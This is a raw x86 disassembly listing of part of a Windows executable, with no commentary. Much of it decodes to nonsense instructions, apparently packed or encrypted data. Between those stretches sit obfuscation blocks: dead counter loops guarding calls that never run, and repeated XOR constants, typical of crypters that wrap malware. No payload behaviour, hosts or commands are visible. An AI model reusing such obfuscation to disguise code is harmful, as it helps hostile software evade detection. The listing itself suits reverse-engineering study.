  405925:	test   eax,0x28418c74
  40592a:	xor    BYTE PTR [ecx-0x53f21377],al
  405930:	add    BYTE PTR [ecx+0x6b49b035],dl
  405936:	outs   dx,DWORD PTR ds:[esi]
  405937:	daa    
  405938:	mov    ds:0x8c0b1a4f,al
  40593d:	enter  0x2cbc,0x7e
  405941:	int3   
  405942:	cmp    eax,0xea3b7a2c
  405947:	and    cl,BYTE PTR [esi+0x54]
  40594a:	pop    edx
  40594b:	xchg   edi,eax
  40594c:	outs   dx,DWORD PTR ds:[esi]
  40594d:	xlat   BYTE PTR ds:[ebx]
  40594e:	mov    eax,ds:0xf1a14fa2
  405953:	adc    DWORD PTR [esi],0xffffff9a
  405956:	scas   al,BYTE PTR es:[edi]
  405957:	int    0x4b
  405959:	push   ecx
  40595a:	xor    DWORD PTR [esi-0x41],0x60522f57
  405961:	mov    edx,0xc759777b
  405966:	jnp    0x405952
  405968:	fcomip st,st(5)
  40596a:	ins    BYTE PTR es:[edi],dx
  40596b:	in     eax,0x89
  40596d:	xchg   esi,eax
  40596e:	repz hlt 
  405970:	ret    
  405971:	add    ah,dh
  405973:	jo     0x4059eb
  405975:	into   
  405976:	push   edx
  405977:	mov    ch,0xf7
  405979:	mov    al,ds:0x43a3e96e
  40597e:	or     dl,cl
  405980:	nop
  405981:	ds icebp 
  405983:	xchg   ch,dl
  405985:	test   BYTE PTR [ebx+0x6bf1fa8e],dl
  40598b:	ins    BYTE PTR es:[edi],dx
  40598c:	sahf   
  40598d:	add    edx,DWORD PTR [eax+edi*2-0x2a7b7db5]
  405994:	jl     0x4059e9
  405996:	adc    eax,0xccfeaad8
  40599b:	sti    
  40599c:	popa   
  40599d:	arpl   bx,ax
  40599f:	idiv   DWORD PTR [ecx+edi*4]
  4059a2:	xchg   edx,eax
  4059a3:	les    eax,FWORD PTR [ebp-0x44e3f3e2]
  4059a9:	outs   dx,DWORD PTR ds:[esi]
  4059aa:	add    al,0x11
  4059ac:	cmp    al,0xa8
  4059ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059af:	fmul   QWORD PTR [esi]
  4059b1:	cld    
  4059b2:	xor    BYTE PTR [esi],dh
  4059b4:	or     dh,BYTE PTR [ecx+0x7396bfd1]
  4059ba:	cld    
  4059bb:	test   eax,0xd8b5169
  4059c0:	dec    esp
  4059c1:	(bad)  
  4059c2:	inc    eax
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	ds mov esi,0xb863555
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405ad6
  405ad0:	mov    edx,0x3e1c46c2
  405ad5:	jmp    0x5de08066
  405ada:	(bad)  
  405adb:	jb     0x405a78
  405add:	push   ds
  405ade:	dec    BYTE PTR [edi+0x3d]
  405ae1:	add    ebp,DWORD PTR [ecx-0x7f84b951]
  405ae7:	sbb    BYTE PTR [edi-0x3],dh
  405aea:	into   
  405aeb:	scas   eax,DWORD PTR es:[edi]
  405aec:	pop    esp
  405aed:	scas   eax,DWORD PTR es:[edi]
  405aee:	xor    DWORD PTR [edi+0x12],esi
  405af1:	inc    eax
  405af2:	repnz push edi
  405af4:	mov    WORD PTR [edi],?
  405af6:	leave  
  405af7:	stc    
  405af8:	xchg   ecx,eax
  405af9:	loopne 0x405b01
  405afb:	call   0x6901:0x2dc21d88
  405b02:	dec    ecx
  405b03:	aas    
  405b04:	fwait
  405b05:	xchg   esp,eax
  405b06:	inc    esp
  405b07:	addr16 pop ecx
  405b09:	push   edx
  405b0a:	mov    BYTE PTR [esi],bl
  405b0c:	jmp    DWORD PTR [edx+eax*4+0xcbd4033]
  405b13:	sbb    al,dh
  405b15:	jbe    0x405b4d
  405b17:	push   edi
  405b18:	and    dl,BYTE PTR [esi-0x15]
  405b1b:	ins    DWORD PTR es:[edi],dx
  405b1c:	jecxz  0x405acd
  405b1e:	mov    eax,0x999f1563
  405b23:	lods   eax,DWORD PTR ds:[esi]
  405b24:	clc    
  405b25:	sbb    al,0xc1
  405b27:	ins    DWORD PTR es:[edi],dx
  405b28:	and    eax,edx
  405b2a:	sbb    DWORD PTR [edi-0x3688c647],edx
  405b30:	pusha  
  405b31:	pop    eax
  405b32:	sub    al,0xbf
  405b34:	jae    0x405bb0
  405b36:	and    DWORD PTR [eax+0x2be337fa],esp
  405b3c:	sub    al,0x64
  405b3e:	and    cl,BYTE PTR [edi-0x76dfb321]
  405b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b45:	xchg   esi,esp
  405b47:	and    ah,BYTE PTR fs:[edx]
  405b4a:	cwde   
  405b4b:	dec    edi
  405b4c:	push   edx
  405b4d:	xchg   esp,eax
  405b4e:	cld    
  405b4f:	stc    
  405b50:	mov    ds:0x99128644,al
  405b55:	xchg   DWORD PTR [eax],edi
  405b57:	popf   
  405b58:	push   ecx
  405b59:	sahf   
  405b5a:	add    esi,DWORD PTR [eax-0x4ccf672c]
  405b60:	nop
  405b61:	test   al,0x95
  405b63:	mov    ds,WORD PTR [esi-0x31c32624]
  405b69:	push   ebp
  405b6a:	(bad)  
  405b6b:	mov    ecx,0xeafd4ac0
  405b70:	ja     0x405b02
  405b72:	adc    DWORD PTR [edx],ecx
  405b74:	cmp    ebx,DWORD PTR [ebx-0x44]
  405b77:	into   
  405b78:	or     cl,al
  405b7a:	retf   0x6147
  405b7d:	cmc    
  405b7e:	dec    edi
  405b7f:	jmp    0x717dabb1
  405b84:	sbb    al,0x8c
  405b86:	push   0xffffffdb
  405b88:	push   eax
  405b89:	pop    edx
  405b8a:	pop    esi
  405b8b:	sub    eax,0x4c11baba
  405b90:	(bad)
  405b93:	push   edx
  405b94:	lds    esi,FWORD PTR [ebp+0x5b]
  405b97:	xchg   esp,eax
  405b98:	xlat   BYTE PTR ds:[ebx]
  405b99:	adc    eax,0x5617327a
  405b9e:	or     al,0x1d
  405ba0:	mov    edi,0x86eff58d
  405ba5:	sub    DWORD PTR [edx+0x5],ecx
  405ba8:	rcr    al,cl
  405baa:	mov    ds:0xa81a0298,eax
  405baf:	xor    al,0xff
  405bb1:	cmp    dl,BYTE PTR [edi+0x50]
  405bb4:	cwde   
  405bb5:	rcl    ebp,1
  405bb7:	add    ebx,DWORD PTR [ebx-0x1a58711e]
  405bbd:	xlat   BYTE PTR ds:[ebx]
  405bbe:	not    BYTE PTR [edx-0x7e]
  405bc1:	imul   eax,DWORD PTR [ebx],0x4daa75da
  405bc7:	imul   ebx,DWORD PTR [eax+edi*1+0x75],0xffffffb3
  405bcc:	enter  0xc124,0xb8
  405bd0:	cli    
  405bd1:	and    BYTE PTR [edx+0x75a5e95e],0xef
  405bd8:	repnz lock (bad) 
  405bdb:	mov    dl,0x2f
  405bdd:	cmp    BYTE PTR [eax+0x336c88a7],ah
  405be3:	inc    edi
  405be4:	mov    edi,0x824b4f44
  405be9:	xor    ebx,DWORD PTR [eax+esi*4-0x2f16a8a5]
  405bf0:	push   ss
  405bf1:	imul   ebp,DWORD PTR [ecx-0x475f5a26],0x5d
  405bf8:	stos   DWORD PTR es:[edi],eax
  405bf9:	das    
  405bfa:	sbb    BYTE PTR ds:0x2f3352ed,ch
  405c00:	mov    dl,0x96
  405c02:	xor    DWORD PTR [edi],ebp
  405c04:	mov    edx,DWORD PTR [ebp+0x8]
  405c07:	and    DWORD PTR ds:0x4245c6,0x0
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	jne    0x405cb0
  405c6a:	imul   edx,DWORD PTR [ecx],0x7e7e084b
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405c5b
  405c75:	xor    DWORD PTR [ecx+0x11c6e304],ebx
  405c7b:	jne    0x405caf
  405c7d:	xchg   DWORD PTR [eax],ebx
  405c7f:	mov    bh,0x54
  405c81:	xor    DWORD PTR [eax],0x61590bfa
  405c87:	xchg   ecx,eax
  405c88:	xor    dl,BYTE PTR [esi+0x1cf19dbd]
  405c8e:	cvtdq2ps xmm7,XMMWORD PTR [eax]
  405c91:	scas   al,BYTE PTR es:[edi]
  405c92:	div    DWORD PTR [edx+0x3d]
  405c95:	imul   edi,DWORD PTR [edx*1+0x52a7f79c],0x26dd55c4
  405ca0:	and    DWORD PTR [edx+0x60],edx
  405ca3:	and    cl,bl
  405ca5:	fdiv   DWORD PTR ds:[ebx-0x3]
  405ca9:	jl     0x405c7b
  405cab:	dec    ecx
  405cac:	jae    0x405cb1
  405cae:	aam    0x8d
  405cb0:	dec    eax
  405cb1:	shl    BYTE PTR [ebx-0x7e6a2a38],0xa9
  405cb8:	cli    
  405cb9:	scas   eax,DWORD PTR es:[edi]
  405cba:	lods   al,BYTE PTR ds:[esi]
  405cbb:	sbb    ebp,DWORD PTR [ebx]
  405cbd:	push   esp
  405cbe:	dec    ecx
  405cbf:	fnstenv [ebx-0xee8859b]
  405cc5:	scas   al,BYTE PTR es:[edi]
  405cc6:	lods   eax,DWORD PTR ds:[esi]
  405cc7:	mov    esi,0x993b0572
  405ccc:	jecxz  0x405c91
  405cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ccf:	pop    ecx
  405cd0:	movhlps xmm7,xmm6
  405cd3:	cmp    al,0x9b
  405cd5:	xor    DWORD PTR [ebp-0x48],ebx
  405cd8:	(bad)  
  405cda:	mov    esp,0x648c013c
  405cdf:	fist   WORD PTR [ebx-0x67be43bb]
  405ce5:	mov    edx,0x7cb9eb63
  405cea:	cdq    
  405ceb:	jl     0x405d53
  405ced:	out    0x92,eax
  405cef:	sbb    dl,ah
  405cf1:	js     0x405c9c
  405cf3:	sbb    eax,0x457412ee
  405cf8:	add    ecx,DWORD PTR [esi]
  405cfa:	dec    edx
  405cfb:	push   ebx
  405cfc:	jno    0x405d1a
  405cfe:	dec    esi
  405cff:	jbe    0x405c9e
  405d01:	in     eax,dx
  405d02:	and    al,0xcd
  405d04:	stos   DWORD PTR es:[edi],eax
  405d05:	dec    esi
  405d06:	int3   
  405d07:	or     BYTE PTR [edi-0x4afe9ece],bl
  405d0d:	ret    
  405d0e:	pusha  
  405d0f:	dec    ebp
  405d10:	inc    esi
  405d11:	pop    esi
  405d12:	jb     0x405d0e
  405d14:	stos   DWORD PTR es:[edi],eax
  405d15:	mov    ch,0x34
  405d17:	pop    ecx
  405d18:	mov    bh,bh
  405d1a:	mov    bh,0x9c
  405d1c:	push   ss
  405d1d:	enter  0xd627,0xc1
  405d21:	xor    ecx,edi
  405d23:	push   esi
  405d24:	adc    DWORD PTR [eax-0x6],edi
  405d27:	gs pop esp
  405d29:	sub    al,0xc8
  405d2b:	jns    0x405d37
  405d2d:	dec    esi
  405d2e:	je     0x405cb0
  405d30:	sti    
  405d31:	and    dl,BYTE PTR [ecx+edx*2+0x36dda60a]
  405d38:	adc    DWORD PTR [ebp+0x35],0x0
  405d3c:	sbb    DWORD PTR [ebp+0x7b],0xffffff96
  405d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d41:	shr    DWORD PTR [edi+0x0],0xd1
  405d45:	rol    DWORD PTR [ebp+ebp*1-0x13],cl
  405d49:	out    dx,al
  405d4a:	(bad)  
  405d4b:	repz (bad) 
  405d4d:	mov    esi,0x19442873
  405d52:	int    0x7d
  405d54:	and    esi,DWORD PTR [ecx]
  405d56:	sbb    al,0x7a
  405d58:	xchg   ebx,eax
  405d59:	pop    esp
  405d5a:	js     0x405d76
  405d5c:	fcmovnb st,st(4)
  405d5e:	pop    ecx
  405d5f:	fdiv   DWORD PTR [eax-0x7850195d]
  405d65:	jns    0x405dc9
  405d67:	mov    ecx,0x423cd7f
  405d6c:	arpl   WORD PTR [esi+0x1d],ax
  405d6f:	cmc    
  405d70:	paddusb mm1,mm6
  405d73:	aaa    
  405d74:	arpl   bp,dx
  405d76:	xor    eax,0xa2d84050
  405d7b:	idiv   BYTE PTR ds:0x86b96787
  405d81:	dec    esi
  405d82:	cs (bad) 
  405d84:	push   0xc3062ef4
  405d89:	adc    BYTE PTR [eax+0x12214fae],cl
  405d8f:	and    eax,DWORD PTR [edi]
  405d91:	ficomp DWORD PTR [ebx+ebx*4+0x5bf120fa]
  405d98:	outs   dx,DWORD PTR ds:[esi]
  405d99:	icebp  
  405d9a:	in     eax,0xd8
  405d9c:	cld    
  405d9d:	mov    ebp,0xd643591a
  405da2:	sub    eax,DWORD PTR [ecx-0x389e11ec]
  405da8:	aad    0x89
  405daa:	push   ebp
  405dab:	or     al,0x47
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dbf:	call   FWORD PTR [edi+ebp*8+0x7e7e0e7c]
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405de2
  405dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcc:	and    al,0x69
  405dce:	aas    
  405dcf:	pop    edx
  405dd0:	dec    edx
  405dd1:	(bad)  
  405dd2:	or     ah,BYTE PTR [ebp+edi*1+0x7bb722e8]
  405dd9:	mov    dl,0xc4
  405ddb:	clc    
  405ddc:	in     eax,0x21
  405dde:	pop    edi
  405ddf:	rcr    DWORD PTR [edi+eax*4],cl
  405de2:	jmp    0xd42f:0x724f86d6
  405de9:	mov    gs:0x4a1d25a3,eax
  405def:	jecxz  0x405d78
  405df1:	je     0x405e0b
  405df3:	mov    dh,0xe9
  405df5:	jns    0x405e60
  405df7:	sbb    al,0xc2
  405df9:	inc    ebx
  405dfa:	mov    eax,0x573f91b1
  405dff:	jns    0x405df0
  405e01:	cmp    BYTE PTR [edi+0x3e],ah
  405e04:	or     al,0xfd
  405e06:	add    bl,ah
  405e08:	sahf   
  405e09:	jmp    0x3e29495d
  405e0e:	xor    BYTE PTR [eax+ecx*2],0xd4
  405e12:	out    dx,al
  405e13:	je     0x405e67
  405e15:	add    al,0x8e
  405e17:	inc    edx
  405e18:	pop    ss
  405e19:	and    ah,BYTE PTR [edi]
  405e1b:	jge    0x405dcf
  405e1d:	je     0x405e12
  405e1f:	sub    ah,BYTE PTR [ecx-0x33076a39]
  405e25:	sbb    al,0xe7
  405e27:	loopne 0x405dd1
  405e29:	dec    ecx
  405e2a:	xchg   BYTE PTR [esp+edi*4],ah
  405e2d:	cdq    
  405e2e:	iret   
  405e2f:	cmp    eax,0x3b1dab3d
  405e34:	sub    DWORD PTR [edi-0x14],0x6d
  405e38:	pop    ds
  405e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3a:	and    eax,0x1d66bb0b
  405e3f:	sbb    al,0x57
  405e41:	lahf   
  405e42:	test   DWORD PTR [esi-0x55],0x181b336f
  405e49:	rcl    edi,0x7a
  405e4c:	loope  0x405ecb
  405e4e:	add    bl,BYTE PTR [esp+eiz*2+0x48]
  405e52:	into   
  405e53:	out    dx,al
  405e54:	push   esp
  405e55:	mov    ebp,0xd09a387
  405e5a:	adc    eax,0xf84802c9
  405e5f:	sbb    bl,BYTE PTR [eax]
  405e61:	pop    eax
  405e62:	iret   
  405e63:	call   0x46b526ad
  405e68:	je     0x405e91
  405e6a:	mov    esi,0xb5038ee9
  405e6f:	mov    ebp,DWORD PTR [eax+ebp*2]
  405e72:	arpl   WORD PTR [ebx],bp
  405e74:	fstp   TBYTE PTR [edx]
  405e76:	mov    edi,0x21de5178
  405e7b:	sbb    eax,0x9822750c
  405e80:	jo     0x405e67
  405e82:	or     dh,ah
  405e84:	loope  0x405e4a
  405e86:	mov    al,0xd9
  405e88:	mov    ah,0x38
  405e8a:	outs   dx,DWORD PTR ds:[esi]
  405e8b:	fistp  QWORD PTR [ebp+0x4]
  405e8e:	push   0x1e
  405e90:	mov    bh,0xa8
  405e92:	cli    
  405e93:	sbb    BYTE PTR [ebx+0x6ff46a2d],ah
  405e99:	inc    edi
  405e9a:	fisubr DWORD PTR [ecx-0x2c4ec11e]
  405ea0:	push   0xdbd18ead
  405ea5:	mov    BYTE PTR [esi],dh
  405ea7:	hlt    
  405ea8:	fcmovnbe st,st(0)
  405eaa:	push   0x77
  405eac:	(bad)  
  405ead:	mov    ah,0x73
  405eaf:	and    BYTE PTR [eax-0x136ab19d],dh
  405eb5:	mov    al,ds:0xa231390f
  405eba:	out    dx,eax
  405ebb:	jmp    0x3f6b2c2f
  405ec0:	mov    ebp,DWORD PTR [ebp-0x769cb767]
  405ec6:	and    eax,ecx
  405ec8:	mov    dl,0x96
  405eca:	into   
  405ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ecc:	pushf  
  405ecd:	cmp    ebx,esp
  405ecf:	aam    0x73
  405ed1:	ss je  0x405ec0
  405ed4:	jns    0x405eed
  405ed6:	mov    edi,0xc73b6d3b
  405edb:	mov    esi,0xf5f6fe61
  405ee0:	shr    DWORD PTR [ebp+0x2e],1
  405ee3:	loope  0x405e6a
  405ee5:	lods   eax,DWORD PTR ds:[esi]
  405ee6:	jmp    0x405e96
  405ee8:	mov    ?,WORD PTR [ecx+0x51]
  405eeb:	retf   0x9ae0
  405eee:	call   0x5ccd7413
  405ef3:	scas   eax,DWORD PTR es:[edi]
  405ef4:	test   al,ah
  405ef6:	mov    edx,0x5df3ea57
  405efb:	or     BYTE PTR [esi],bl
  405efd:	dec    eax
  405efe:	pushf  
  405eff:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  405f06:	xor    edi,edi
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0xdbdb13c5
  406054:	xchg   edi,eax
  406055:	dec    ebx
  406056:	cmp    DWORD PTR [ecx],esp
  406058:	movd   DWORD PTR [esi+0x23],mm7
  40605c:	jg     0x4060dc
  40605e:	jle    0x4060aa
  406060:	and    DWORD PTR [edi+0x15],ebx
  406063:	mov    esp,DWORD PTR [edi-0x303b395d]
  406069:	dec    edi
  40606a:	rcl    DWORD PTR gs:[edi-0x5c],1
  40606e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40606f:	bound  edx,QWORD PTR [ebp-0x2b]
  406072:	xchg   BYTE PTR [ebx],ch
  406074:	jno    0x40603f
  406076:	int3   
  406077:	add    al,0x88
  406079:	xchg   edx,eax
  40607a:	mov    edi,0x3e2d2dcc
  40607f:	test   al,0x8e
  406081:	or     al,0xed
  406083:	sbb    BYTE PTR [edi],cl
  406085:	nop
  406086:	sti    
  406087:	mov    ecx,0xfa725d9f
  40608c:	mov    WORD PTR [edi+0x291e9ac6],0x45ae
  406095:	pop    ebp
  406096:	sub    edi,esi
  406098:	scas   eax,DWORD PTR es:[edi]
  406099:	aas    
  40609a:	pop    edi
  40609b:	and    BYTE PTR [edx-0x6b],dh
  40609e:	aam    0x9
  4060a0:	in     eax,0x75
  4060a2:	(bad)  
  4060a3:	or     bl,BYTE PTR [edi+0x35]
  4060a6:	shl    DWORD PTR ds:0x6b57a4c7,cl
  4060ac:	push   ds
  4060ad:	not    BYTE PTR [eax-0x70250ba6]
  4060b3:	sbb    DWORD PTR cs:[eax],0x3c
  4060b7:	in     eax,dx
  4060b8:	gs push es
  4060ba:	inc    esi
  4060bb:	jo     0x40607f
  4060bd:	add    eax,0x3c0e66fa
  4060c2:	inc    ebx
  4060c3:	xor    eax,0xd1e4e9f5
  4060c8:	adc    DWORD PTR [esi-0x2cedebd3],esp
  4060ce:	mov    ?,WORD PTR [esi+0x6f4b0176]
  4060d4:	xchg   ebp,eax
  4060d5:	cmc    
  4060d6:	inc    ecx
  4060d7:	fisttp WORD PTR [ebp+0xdf65653]
  4060dd:	xchg   bh,al
  4060df:	cli    
  4060e0:	std    
  4060e1:	pop    esp
  4060e2:	(bad)  [edx-0x20aaec0b]
  4060e8:	push   eax
  4060e9:	inc    edx
  4060ea:	jg     0x40610f
  4060ec:	add    BYTE PTR [eax+0x21c2f169],ah
  4060f2:	mov    ecx,0x8dac4057
  4060f7:	test   ah,dh
  4060f9:	pop    edx
  4060fa:	bound  ebp,QWORD PTR [eax+0x5e7af458]
  406100:	ret    
  406101:	clc    
  406102:	aas    
  406103:	jmp    0x9017:0x56e19077
  40610a:	ja     0x406167
  40610c:	in     eax,dx
  40610d:	jmp    0x9617a7d8
  406112:	test   DWORD PTR [ecx-0x2e],esi
  406115:	mov    ?,WORD PTR [edi]
  406117:	loop   0x406186
  406119:	shr    dh,0x1d
  40611c:	xchg   DWORD PTR [edx+0x73],ebp
  40611f:	lock sub al,0xf5
  406122:	scas   al,BYTE PTR es:[edi]
  406123:	ret    
  406124:	test   al,0xb4
  406126:	(bad)  
  406127:	(bad)  
  406129:	push   es
  40612a:	push   eax
  40612b:	pushf  
  40612c:	mov    eax,ds:0xd36fad8a
  406131:	loopne 0x406187
  406133:	jb     0x4060f0
  406135:	out    0x68,al
  406137:	xor    BYTE PTR [ecx-0x3b],cl
  40613a:	xlat   BYTE PTR ds:[ebx]
  40613b:	mov    WORD PTR [eax-0xe],es
  40613e:	scas   al,BYTE PTR es:[edi]
  40613f:	fs jl  0x4061ae
  406142:	shr    ecx,cl
  406144:	cmp    esp,DWORD PTR [edx]
  406146:	push   es
  406147:	(bad)  
  406148:	adc    eax,0xdf20f84a
  40614d:	xchg   ebx,eax
  40614e:	and    eax,0xe1fa9a94
  406153:	clc    
  406154:	fcom   DWORD PTR [ebx+0x4f]
  406157:	jmp    0x4060e0
  406159:	scas   al,BYTE PTR es:[edi]
  40615a:	xchg   ebx,eax
  40615b:	nop
  40615c:	fmul   st,st(4)
  40615e:	sub    eax,0xf8ee074d
  406163:	push   ecx
  406164:	push   0x36
  406166:	test   BYTE PTR [edi],0x7f
  406169:	repz add eax,0xafe9945a
  40616f:	and    esi,DWORD PTR [edi+0x18c63bee]
  406175:	and    esp,ebp
  406177:	leave  
  406178:	cld    
  406179:	into   
  40617a:	jmp    0x406130
  40617c:	cld    
  40617d:	xchg   ebp,eax
  40617e:	mov    dh,0xf1
  406180:	or     dl,BYTE PTR [ecx+0x1]
  406183:	jne    0x4061bd
  406185:	jmp    DWORD PTR [ecx-0x44a15fc2]
  40618b:	data16 mov bl,BYTE PTR [esi-0x62]
  40618f:	xchg   edi,eax
  406190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406191:	pushf  
  406192:	stc    
  406193:	mov    eax,ds:0xfc5e953
  406198:	add    BYTE PTR [eax],al
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
